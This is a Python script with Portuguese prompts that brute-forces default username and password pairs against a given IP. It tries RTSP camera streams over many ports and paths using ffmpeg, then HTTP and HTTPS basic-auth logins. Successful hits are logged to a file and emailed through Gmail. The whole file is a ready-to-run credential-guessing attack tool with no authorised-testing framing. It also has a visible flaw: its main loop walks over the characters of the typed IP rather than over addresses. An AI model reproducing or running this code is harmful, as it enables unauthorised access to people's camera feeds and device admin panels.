import subprocess
import requests
from requests.auth import HTTPBasicAuth
import smtplib
from email.message import EmailMessage

EMAIL_ORIGEM = input("qual o seu email?: ")
EMAIL_DESTINO = input("para quem você quer enviar esse email?: ")
EMAIL_SENHA = input("qual a senha do seu email?: ")

EMAIL_ORIGEM = EMAIL_ORIGEM.lower()
EMAIL_DESTINO = EMAIL_DESTINO.lower()

ips = input("digite o ip desejado: ")


ports_rtsp = [554, 8554, 10554, 7070, 5544, 1055, 322, 5000, 9000]
print(ports_rtsp)

ports_http = [80, 8080, 8000, 8888, 8880, 81, 82, 83, 10080, 5000, 5001, 3128, 8081, 8090, 60080, 49152]
print(ports_http)

ports_https = [443, 8443, 9443, 10443, 1443, 9440, 4430, 4443, 444, 4444, 1044]
print(ports_https)


creds = [
    ("admin", "admin"),
    ("admin", "1234"),
    ("admin", "password"),
    ("admin", ""),
    ("", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "root"),
    ("admin", "guest"),
    ("root", "root"),
    ("root", "admin"),
    ("root", "1234"),
    ("root", "12345"),
    ("root", "123456"),
    ("root", ""),
    ("user", "user"),
    ("user", "1234"),
    ("user", "12345"),
    ("user", "123456"),
    ("guest", "guest"),
    ("guest", "1234"),
    ("guest", "12345"),
    ("guest", "123456"),
    ("guest", "admin"),
    ("support", "support"),
    ("support", "1234"),
    ("support", "12345"),
    ("admin1", "password"),
    ("admin1", "1234"),
    ("administrator", "admin"),
    ("administrator", "password"),
    ("administrator", "1234"),
    ("administrator", "123456"),
    ("admin", "meinsm"),
    ("admin", "1111"),
    ("admin", "0000"),
    ("root", "0000"),
    ("root", "1111"),
    ("root", "toor"),
    ("default", "default"),
    ("default", "1234"),
    ("default", "admin")
]


paths_rtsp = [
    "/live", "/h264", "/h265", "/stream", "/stream1", "/stream2", "/video", "/video1", "/video2",
    "/live.sdp", "/live1.sdp", "/ch1-s1", "/ch1-s2", "/cam/realmonitor", "/cam/stream", "/cam/stream1",
    "/onvif1", "/onvif/device_service", "/media/video1", "/media/video2", "/media/video0", "/videoMain",
    "/11", "/12", "/13", "/0", "/1", "/media", "/live/ch1", "/live/ch2", "/live/stream", "/livestream",
    "/cam0_0"
]

arquivo_log = "vulnerabilidades.txt"
open(arquivo_log, "w").close()  # limpa antes de iniciar

def testar_rtsp(ip, port, user, pwd, path):
    url = f"rtsp://{user}:{pwd}@{ip}:{port}{path}"
    print(f"Testando RTSP: {url}")
    try:
        result = subprocess.run(
            ["ffmpeg", "-rtsp_transport", "tcp", "-i", url, "-t", "2", "-f", "null", "-"],
            capture_output=True, text=True, timeout=10
        )
        if "401" in result.stderr:
            print(" → Credenciais incorretas")
        elif "frame=" in result.stderr or result.returncode == 0:
            print(" ✅ RTSP ACESSÍVEL: ", url)
            salvar_vulnerabilidade(f"[RTSP] {url}")
        else:
            print(" → Não acessível")
    except subprocess.TimeoutExpired:
        print(" → Timeout")

def testar_http_https(ip, port, user, pwd, use_https=False):
    protocol = "https" if use_https else "http"
    url = f"{protocol}://{ip}:{port}"
    print(f"Testando {protocol.upper()} com {user}:{pwd} → {url}")
    try:
        response = requests.get(url, auth=HTTPBasicAuth(user, pwd), timeout=5, verify=False)
        if response.status_code == 200:
            print(" ✅ LOGIN POSSIVELMENTE BEM-SUCEDIDO: ", url)
            salvar_vulnerabilidade(f"[{protocol.upper()}] {url} com {user}:{pwd}")
        elif response.status_code == 401:
            print(" → Credenciais incorretas")
        elif response.status_code in [403, 404]:
            print(" → Acesso negado ou não encontrado")
        elif response.status_code in [301, 302]:
            print(" → Redirecionamento detectado")
        else:
            print(f" → Código de resposta: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(" → Erro na conexão:", str(e))

def salvar_vulnerabilidade(texto):
    with open(arquivo_log, "a") as f:
        f.write(texto + "\n")

def enviar_email():
    try:
        with open(arquivo_log, "r") as f:
            conteudo = f.read()

        if not conteudo.strip():
            print("📭 Nenhuma vulnerabilidade detectada. Nenhum e-mail será enviado.")
            return

        msg = EmailMessage()
        msg["Subject"] = "Relatório de Vulnerabilidades Detectadas"
        msg["From"] = EMAIL_ORIGEM
        msg["To"] = EMAIL_DESTINO
        msg.set_content(conteudo)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(EMAIL_ORIGEM, EMAIL_SENHA)
            smtp.send_message(msg)

        print("📧 E-mail enviado com sucesso.")
    except Exception as e:
        print("❌ Erro ao enviar e-mail:", str(e))

for ip in ips:
    print(f"\n🎯 Iniciando testes para IP: {ip}")

    
    for port in ports_rtsp:
        for user, pwd in creds:
            for path in paths_rtsp:
                testar_rtsp(ip, port, user, pwd, path)

  
    for port in ports_http:
        for user, pwd in creds:
            testar_http_https(ip, port, user, pwd, use_https=False)

    
    for port in ports_https:
        for user, pwd in creds:
            testar_http_https(ip, port, user, pwd, use_https=True)

enviar_email()